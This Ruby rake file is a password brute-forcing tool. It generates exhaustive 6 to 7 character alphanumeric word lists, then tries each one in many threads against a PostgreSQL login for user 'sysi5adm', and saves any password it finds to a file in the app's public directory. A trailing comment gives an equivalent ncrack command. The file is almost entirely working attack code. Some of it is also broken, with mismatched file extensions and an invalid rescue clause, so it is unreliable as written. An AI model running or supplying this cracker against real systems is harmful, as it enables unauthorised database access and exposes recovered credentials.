namespace :test do
  require 'pg'
  LIST = (('A'..'Z').to_a + ('a'..'z').to_a + ('0'..'9').to_a).freeze
  COLUMN_LIMIT = 100.freeze
  task brute_db: :environment do
    Thread.abort_on_exception = true
    begin
      job_queue = SizedQueue.new(5)
      threads = []
      Dir["#{Rails.root}/public/password_list/*/*.csv"].each do |csv_path|
        puts "path #{csv_path}"
        CSV.foreach(csv_path) do |row|
          row.each do |word|
            job_queue.push(word)
            threads << Thread.new do
              connect_db(word)
              job_queue.pop
            end
          end
          threads.map(&:join)
          # Parallel.each(row, in_threads: 2) do |word|
          #   connect_db(word)
          # end
        end
      end
    rescue => StopRecursive
      puts"found password: #{StopRecursive.message}"
    end
  end
  task connect: :environment do
    pass = 'sysi5adm'
    begin
      con = PG.connect  dbname: 'i5_TEST',
                        user: 'sysi5adm',
                        host: 'db',
                        port: '5444',
                        password: pass
      puts "Password db psql: #{pass}"
      # File.write("#{Rails.root}/pass_db.txt","Password db psql: #{pass}")
      raise StopRecursive.new(pass)
    rescue PG::Error => e
      # puts "#{e.message} pass error #{pass}"
      nil
    ensure
      con.close if con
    end
  end
require 'csv'
  task create_password_list: :environment do
    (6..7).each do |num_of_char|
      puts "#{num_of_char} alphabets"
      page = 1
      print "page #{page}"
      words = []
      generate_word(num_of_char,'') do |word|
        words << word
        if words.length == 10_000_000
          create_csv_file(num_of_char: num_of_char, page: page, words: words)
          words = []
          print "\b"*(page/10 + 1)
          print "#{page+=1}"
        end
      end
      create_csv_file(num_of_char: num_of_char, page: page, words: words) unless words.empty?
    end
  end

  def create_csv_file(num_of_char:, page:, words:)
    File.open("#{Rails.root}/public/password_list/#{num_of_char}/#{num_of_char}_alphabets.txt",'a') do |file|
      words.each{ |word|file.puts word}
    end
  end

  def generate_word(n, word ='', &block)
    if word.length == n
      block.call word
    else
      LIST.each do |char|
        generate_word(n, word + char, &block)
      end
    end
  end

  def connect_db(pass)
    begin
      con = PG.connect  dbname: 'i5_TEST',
                        user: 'sysi5adm',
                        host: 'db',
                        port: '5444',
                        password: pass
      puts "Password db psql: #{pass}"
      File.write("#{Rails.root}/pass_db.txt","Password db psql: #{pass}")
      raise StopRecursive.new(pass)
    rescue PG::Error => e
      # puts "#{e.message} pass error #{pass}"
      nil
    ensure
      con.close if con
    end
  end



  class StopRecursive < StandardError;end
end
# ncrack –v –U user.txt –P password_list/4/4_alphabets1.csv localhost:5444